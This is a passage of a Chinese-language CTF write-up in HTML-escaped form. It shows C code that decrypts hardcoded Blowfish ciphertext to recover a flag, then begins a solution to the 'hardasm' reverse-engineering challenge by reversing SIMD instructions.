&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;swap&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; b) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; tmp;
    
    tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;b;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;blowfish_f&lt;/span&gt;(blowfish_t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; container, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; input) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint8_t&lt;/span&gt; a, b, c, d;
    
    a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;;
    b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (input &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;;
    c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (input &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;;
    d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;;
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ((container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;s[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][a] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;s[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][b]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;s[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;][c]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
            container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;s[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;][d];
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;blowfish_cipher&lt;/span&gt;(blowfish_t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; container, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; xl, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; xr, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint8_t&lt;/span&gt; mode) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; loc_xl, loc_xr;
    
    loc_xl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;xl;
    loc_xr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;xr;
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(mode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOWFISH_ENCRYPT) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; PASSES; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            loc_xl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_xl &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[i];
            loc_xr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; blowfish_f(container, loc_xl) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; loc_xr;
        
            swap(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;loc_xl, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;loc_xr);
        }
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(mode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOWFISH_DECRYPT) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PASSES&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;) {
            loc_xl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_xl &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[i];
            loc_xr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; blowfish_f(container, loc_xl) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; loc_xr;
        
            swap(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;loc_xl, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;loc_xr);
        }
    }
        
    swap(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;loc_xl, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;loc_xr);
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(mode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOWFISH_ENCRYPT) { 
        loc_xr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_xr &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[PASSES];
        loc_xl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_xl &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[PASSES&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(mode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOWFISH_DECRYPT) {
        loc_xr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_xr &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
        loc_xl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_xl &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
    }
    
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;xl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_xl;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;xr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_xr;
}

blowfish_t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;blowfish_initialize&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; length) {
    blowfish_t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; container &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; malloc(&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(blowfish_t));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i, ii, j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; tmp, tmp_l &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, tmp_r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;  

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(length &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; BLOWFISH_MAX_KEY_BYTES) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (blowfish_t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) NULL;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; PASSES&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; P[i];
    }
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; SBOXES; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(ii &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ii &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;; ii&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;s[i][ii] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; S[i][ii];
        }
    }
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; PASSES&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(ii &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ii &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; ii&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (tmp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; key[j];
            j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(j &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; length) 
                j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }
        container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; tmp;
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; PASSES&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) {
        blowfish_cipher(container, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tmp_l, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tmp_r, BLOWFISH_ENCRYPT);
        container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp_l;
        container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p[i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp_r;
    }
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; SBOXES; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {  
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(ii &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ii &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;; ii &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) { 
            blowfish_cipher(container, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tmp_l, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tmp_r, BLOWFISH_ENCRYPT);
            container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;s[i][ii] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp_l;
            container&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;s[i][ii&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp_r;
        }
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; argv) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; high, low;
    blowfish_t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; container &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; blowfish_initialize(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LET_U_D&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;);
    high &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1416580799u&lt;/span&gt;;
    low &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3035468667u&lt;/span&gt;;
    blowfish_cipher(container, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;high, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;low, BLOWFISH_DECRYPT);
    &lt;span style=&#34;color:#75715e&#34;&gt;// write(1, &amp;amp;high, 8);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;high, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;low, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    high &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2194841726u&lt;/span&gt;;
    low &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;332656605u&lt;/span&gt;;
    blowfish_cipher(container, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;high, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;low, BLOWFISH_DECRYPT);
    &lt;span style=&#34;color:#75715e&#34;&gt;// write(1, &amp;amp;high, 8);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;high, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;low, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    high &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;571059727u&lt;/span&gt;;
    low &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1498341217u&lt;/span&gt;;
    blowfish_cipher(container, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;high, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;low, BLOWFISH_DECRYPT);
    &lt;span style=&#34;color:#75715e&#34;&gt;// write(1, &amp;amp;high, 8);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;high, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;low, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    high &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3107158060u&lt;/span&gt;;
    low &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;470279474u&lt;/span&gt;;
    blowfish_cipher(container, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;high, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;low, BLOWFISH_DECRYPT);
    &lt;span style=&#34;color:#75715e&#34;&gt;// write(1, &amp;amp;high, 8);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;high, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;low, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;blowfish.h&lt;/code&gt; 去仓库找就行&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;试了一下 pycrypto 库，解出来的有问题，可能库的实现和这个有区别，没深入研究&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;week4&#34;&gt;week4&lt;/h2&gt;
&lt;h3 id=&#34;rehardasm&#34;&gt;[RE]hardasm&lt;/h3&gt;
&lt;p&gt;全是 simd，反着执行回去就行，或者可以试试正着用 z3 解&lt;/p&gt;
&lt;p&gt;这个脚本因为有些指令的某一个参数是不变的（比如 &lt;code&gt;vpermd ymmX, ymm7, ymmX&lt;/code&gt;），所以偷懒了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;asm &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;vpermd  ymm4, ymm7, ymm4
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;...
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;vpermd  ymm1, ymm7, ymm1&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

ymm0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x93\xcb\xe7\x93\xa9\x81\r\xb6\xd8\xdd\x9c\x7f\xc0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcd\xf0\x00\xa0\x9f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89\xef&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;T]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xef\x00\x8d\xfe&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^L&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0\xec&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
ymm1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;i&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcf\x8e\xb3\xf8\x98\x90\x0b\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcf\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1d\x96&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8b\xc7\xaa\xfc\xaf\xfd\x91&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;F3e&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcd\xa5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
